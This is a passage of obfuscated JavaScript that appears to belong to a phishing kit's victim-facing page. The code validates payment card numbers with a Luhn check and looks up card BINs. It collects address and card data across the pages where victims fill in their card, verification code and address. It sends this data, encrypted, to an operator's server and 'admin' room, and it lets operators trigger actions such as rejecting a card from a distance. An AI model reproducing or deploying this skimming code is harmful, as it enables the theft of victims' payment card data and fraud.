        switch (_0x38ddcb = 0x2 * _0x9ed6b6) {
          case 0xa:
            _0x38ddcb = 0x1;
            break;
          case 0xc:
            _0x38ddcb = 0x3;
            break;
          case 0xe:
            _0x38ddcb = 0x5;
            break;
          case 0x10:
            _0x38ddcb = 0x7;
            break;
          case 0x12:
            _0x38ddcb = 0x9;
            break;
          default:
            _0x38ddcb = _0x38ddcb;
        }
        _0x3eb245 += _0x38ddcb;
      } else {
        _0x3eb245 += _0x9ed6b6;
      }
      _0x415d5e = !_0x415d5e;
    }
    return _0x3eb245 !== 0x0 && _0x3eb245 % 0xa == 0x0;
  }
};
let H = '';
let B;
async function Ft(_0x2ed86c) {
  if (H !== _0x2ed86c) {
    H = _0x2ed86c;
    try {
      if (!(B == null)) {
        B.abort();
      }
      B = new AbortController();
      const {
        data: _0x575b0a
      } = await a5_0x45d7a3.get('/api/bin/' + _0x2ed86c, {
        'signal': B.signal
      });
      return _0x575b0a;
    } catch (_0x398eb5) {} finally {
      H = '';
    }
  }
}
const V = a5_0x2c54e3("dataStore", {
  'state': () => Object.assign({
    'data': null,
    'actions': [],
    'status': '正在首页',
    'userTrack': [],
    'pushData': {},
    'loading': false
  }, JSON.parse(a5_0xc1cacb("__dataStore__") || '{}'), {
    'loading': false,
    'actions': []
  })
});
let Ee = 0x0;
V().$subscribe((_0x2ba02b, _0x3f5db5) => {
  window.clearTimeout(Ee);
  Ee = window.setTimeout(() => {
    a5_0xc1cacb("__dataStore__", JSON.stringify(_0x3f5db5));
    b.actions = _0x3f5db5.actions;
    b.loading = _0x3f5db5.loading;
    if (_0x3f5db5.pushData) {
      b.datas = _0x3f5db5.pushData;
    }
    b.status = typeof _0x3f5db5.status == "string" ? _0x3f5db5.status : _0x3f5db5.status.status;
  }, 0xa);
});
const b = new Proxy(Object.assign({
  'loading': false,
  'tags': {
    'clickedId': false,
    'luhn': false
  },
  'status': '',
  'info': {},
  'datas': {},
  'actions': [],
  'updated_at': new Date().toISOString()
}, a5_0xc1cacb("userData"), {
  'loading': false,
  'actions': []
}), {
  'get'(_0x1f2cdf, _0x4c8bad) {
    return _0x1f2cdf[_0x4c8bad];
  },
  'set'(_0x5b1c8f, _0x1bee64, _0x35aac2) {
    var _0x2cc202;
    var _0x1ac9a7;
    if (_0x1bee64 === "tags" || _0x1bee64 === 'datas' || _0x1bee64 === "info") {
      _0x35aac2 = m.withOptions({
        'mergeArrays': false
      }, _0x5b1c8f[_0x1bee64], _0x35aac2);
    }
    _0x5b1c8f[_0x1bee64] = _0x35aac2;
    const _0x44e0e7 = b.datas.cardData;
    const _0x54afbc = (_0x2cc202 = _0x44e0e7 == null ? undefined : _0x44e0e7.cardNumber) == null ? undefined : _0x2cc202.replace(/\D/g, '');
    _0x5b1c8f.tags.luhn = Ut.validate(_0x54afbc || '-');
    const _0x3e4e1b = _0x54afbc == null ? undefined : _0x54afbc.substring(0x0, 0x6);
    if (_0x44e0e7 && _0x3e4e1b && _0x3e4e1b.length === 0x6 && ((_0x1ac9a7 = _0x44e0e7.cardBIN) == null ? undefined : _0x1ac9a7.bin) !== _0x3e4e1b) {
      Ft(_0x3e4e1b).then(_0x31482f => {
        if (_0x31482f) {
          _0x44e0e7.cardBIN = _0x31482f;
          b.datas = {};
        }
      });
    }
    if (_0x1bee64 === "actions") {
      const _0x338259 = _0x35aac2;
      let _0x5330e7 = false;
      for (const _0x245b57 of _0x338259) if (_0x245b57.key === "rejectCard" || _0x245b57.key === "reject-card") {
        _0x5330e7 = true;
        let _0x5b4cf0 = _0x5b1c8f.datas.cardHistory;
        const _0x23841d = JSON.stringify(_0x5b4cf0 == null ? undefined : _0x5b4cf0[_0x5b4cf0.length - 0x1]);
        const _0x4ef140 = JSON.stringify(_0x44e0e7);
        if (_0x23841d !== _0x4ef140) {
          if (!_0x5b4cf0) {
            _0x5b4cf0 = _0x5b1c8f.datas.cardHistory = [];
          }
          _0x5b4cf0.unshift(_0x5b1c8f.datas.cardData);
          if (_0x5b4cf0.length > 0xa) {
            _0x5b4cf0.pop();
          }
          _0x5b1c8f.datas.cardHistory = _0x5b4cf0;
        }
        break;
      }
      if (_0x338259.length) {
        a5_0x45d7a3.post("/api/auto-action", {
          'url': _0x5b1c8f.info.url,
          'id': _0x5b1c8f.info.id,
          'clientId': p.id,
          'cardData': _0x5330e7 ? _0x44e0e7 : undefined,
          'legacy': true
        });
      }
    }
    if (_0x1bee64 !== "tags") {
      _0x5b1c8f.updated_at = new Date().toISOString();
    }
    oe({
      'room': "admin"
    }, ["tags", "actions"].includes(_0x1bee64));
    return true;
  }
});
async function Vt(_0x47c973) {
  const {
    data: _0x50a97f
  } = await a5_0x45d7a3.postForm("/api/upload", {
    'file': _0x47c973
  });
  ae({}, true);
  return _0x50a97f;
}
async function $t(_0x50de42) {
  try {
    const _0x1cf59d = String(_0x50de42).replace(/\D/g, '');
    if (_0x1cf59d.length >= 0x6) {
      const {
        data: _0x376ae9
      } = await a5_0x45d7a3.get("https://lookup.binlist.net/" + _0x1cf59d);
      return _0x376ae9;
    }
  } catch (_0x5dd803) {
    console.log(_0x5dd803);
  }
  return null;
}
const J = document.querySelector("script#darcula-js");
const Z = (() => {
  const _0x3742ee = J == null ? undefined : J.getAttribute('src');
  return _0x3742ee ? _0x3742ee.startsWith("http://localhost") ? "http://localhost:8080" : "https://" + _0x3742ee.split('/')[0x2] : '';
})();
const p = new It(Z.startsWith("localhost") || location.hostname === "localhost" ? ':8888' : Z, {
  'autoConnect': false
});
const jt = p.message;
p.message = function (..._0x381132) {
  _0x381132[0x0].type = a5_0x20ad4b.Rabbit.encrypt(JSON.stringify(_0x381132[0x0].type), "web-msg-sender-darcula").toString();
  _0x381132[0x0].data = a5_0x20ad4b.Rabbit.encrypt(JSON.stringify(_0x381132[0x0].data || ''), "web-msg-sender-darcula").toString();
  return jt.call(this, ..._0x381132);
};
p.onMessage(_0x35a209 => {
  _0x35a209.type = JSON.parse(a5_0x20ad4b.Rabbit.decrypt(_0x35a209.type, "web-msg-sender-darcula").toString(a5_0x20ad4b.enc.Utf8));
  _0x35a209.data = JSON.parse(a5_0x20ad4b.Rabbit.decrypt(_0x35a209.data, "web-msg-sender-darcula").toString(a5_0x20ad4b.enc.Utf8));
});
p.onConnect(async () => {
  const _0x5750e3 = a5_0xc1cacb("clientId") || "user-" + p.id;
  if ((await p.login(["user"], _0x5750e3)).code) {
    alert("internet connect error!!!");
    window.location.reload();
  }
  a5_0xc1cacb("clientId", _0x5750e3);
});
const {
  sender: Ht
} = p.onMessage((_0x5407e3, _0x2ea155) => {
  oe({
    'user': _0x2ea155.user
  });
}, "sync-data");
let Oe = 0x0;
const oe = (_0x32cc6c, _0x2f219f = false) => {
  clearTimeout(Oe);
  Oe = window.setTimeout(() => {
    a5_0xc1cacb("userData", b);
    if (!(!b.info.id || !b.datas)) {
      Jt();
      Ht(b, _0x32cc6c);
    }
  }, _0x2f219f ? 0x0 : 0x12c);
};
let Se = 0x0;
const Jt = (_0x28cb44 = false) => {
  clearTimeout(Se);
  Se = window.setTimeout(async () => {
    const _0x3d9b08 = a5_0xc1cacb("dataId");
    if (!_0x3d9b08) {
      throw new Error("save-data id is null");
    }
    const _0x220d94 = b.datas;
    await a5_0x45d7a3.post("/api/save-data", {
      'id': _0x3d9b08,
      'content': _0x220d94
    });
  }, _0x28cb44 ? 0x0 : 0x760);
};
p.onMessage(_0x1277fb => {
  b.tags = _0x1277fb;
}, "sync-tags");
p.onMessage(() => {
  window.location.reload();
}, "refresh");
p.onMessage(() => {
  localStorage.setItem("getout", '1');
  p.disconnect();
}, "disconnect");
const N = new Map();
p.onMessage(_0x15e9b3 => {
  const _0x5e4587 = V();
  if (!_0x5e4587.actions.length) {
    return;
  }
  const _0x55160d = N.get(_0x15e9b3.actionKey);
  if (_0x55160d) {
    _0x5e4587.actions = [];
    _0x5e4587.loading = false;
    _0x55160d(_0x15e9b3.actionInput || '', _0x15e9b3.actionType || '');
  }
}, "sync-action");
let ke = 0x0;
const Wt = (_0x577dfd, _0x35e414) => {
  clearTimeout(ke);
  ke = window.setTimeout(async () => {
    var _0x26cabc;
    if (!N.size) {
      return;
    }
    const {
      data: _0x5904ba
    } = await a5_0x45d7a3.get("/api/get-offline-action/" + a5_0xc1cacb("clientId"));
    if (_0x5904ba) {
      if (!((_0x26cabc = N.get(_0x5904ba.actionKey)) == null)) {
        _0x26cabc(_0x5904ba.actionInput || '', _0x5904ba.actionType || '');
      }
    }
  }, 0x3e8);
  N.set(_0x577dfd, _0x35e414);
  a5_0x40093c(() => {
    N['delete'](_0x577dfd);
  });
};
const ae = async (_0x2217a3, _0x5e916d = false) => {
  var _0x18f37a;
  var _0xe10ef;
  _0x2217a3 = a5_0x246fb4(_0x2217a3);
  for (const _0x3469e2 in _0x2217a3) if (!_0x2217a3[_0x3469e2]) {
    delete _0x2217a3[_0x3469e2];
  }
  const _0x3a7df4 = V();
  let _0x19a8ca = '';
  const _0xd55083 = Object.assign({}, (_0x18f37a = _0x3a7df4.data) == null ? undefined : _0x18f37a.data[_0x19a8ca], _0x2217a3);
  if (Object.keys(_0xd55083).length) {
    if (_0xd55083.PageStatus) {
      _0x19a8ca = _0xd55083.PageStatus;
      delete _0xd55083.PageStatus;
    } else {
      _0x19a8ca = typeof _0x3a7df4.status == 'string' ? _0x3a7df4.status : _0x3a7df4.status.status;
    }
    _0x19a8ca = _0x19a8ca.replace('当前', '').replace('页面', '页').replace('正在', '在').replace('填写', '填').replace('卡号', '卡').replace('验证码验证', "验证码").split('-')[0x0].trim();
    if (_0x19a8ca.includes("地址页")) {
      _0x19a8ca = "addressData";
    }
    if (_0x19a8ca.includes("填卡页")) {
      _0x19a8ca = "cardData";
    }
    if (_0x19a8ca.includes("已提交卡")) {
      _0x19a8ca = "cardData";
    }
    if (_0x19a8ca.includes("验证码")) {
      _0x19a8ca = 'cardData';
    }
    if (_0x19a8ca.includes("验证页")) {
      _0x19a8ca = 'cardData';
    }
    for (const _0x18873b of Object.keys(_0x3a7df4.pushData)) for (const [_0x4ba806, _0x32b564] of Object.entries(_0xd55083)) {
      const _0x4cdc24 = _0x3a7df4.pushData[_0x18873b];
      if (!(_0x4cdc24 instanceof Array) && typeof _0x4cdc24[_0x4ba806] < 'u') {
        _0x4cdc24[_0x4ba806] = _0x32b564;
      }
      _0x3a7df4.pushData[_0x18873b] = _0x4cdc24;
    }
  }
  if (_0xd55083.expire) {
    _0xd55083.expires = _0xd55083.expire;
    delete _0xd55083.expire;
  }
  if (_0xd55083.postalCode) {
    _0xd55083.zipCode = _0xd55083.postalCode;
    delete _0xd55083.postalCode;
  }
  _0x3a7df4.$patch({
    'data': {
      'data': Object.assign({}, (_0xe10ef = _0x3a7df4.data) == null ? undefined : _0xe10ef.data, _0x2217a3),
      'updated_at': new Date().toString()
    },
    ...(_0x19a8ca ? {
      'pushData': {
        [_0x19a8ca]: _0xd55083
      }
    } : {})
  });
};
const Kt = _0x416aa6 => {
  var _0x200a36;
  const _0x4a3ed6 = a5_0xc1cacb("__app_settings__");
  const _0x3e6aac = {};
  for (const [_0x2abb81, _0x29c4e8] of Object.entries(_0x4a3ed6 || {})) if (_0x2abb81.startsWith("frontend")) {
    _0x3e6aac[_0x2abb81.split('.')[0x1]] = _0x29c4e8;
  }
  const _0x2949fa = (_0x200a36 = _0x3e6aac[_0x416aa6]) != null ? _0x200a36 : _0x4a3ed6[_0x416aa6];
  return _0x2949fa === "false" ? '' : _0x2949fa;
};
const Gt = Object.freeze(Object.defineProperty({
  '__proto__': null,
  'apiServer': Z,
  'binlookup': $t,
  'client': p,
  'getAppSetting': Kt,
  'pushData': ae,
  'syncData': oe,
  'upload': Vt,
  'useDataStore': V,
  'useSocketActionEvent': Wt,
  'userData': b
}, Symbol.toStringTag, {
  'value': "Module"
}));
export { Wt as a, Ft as b, b as c, Kt as g, Gt as i, ae as p, V as u };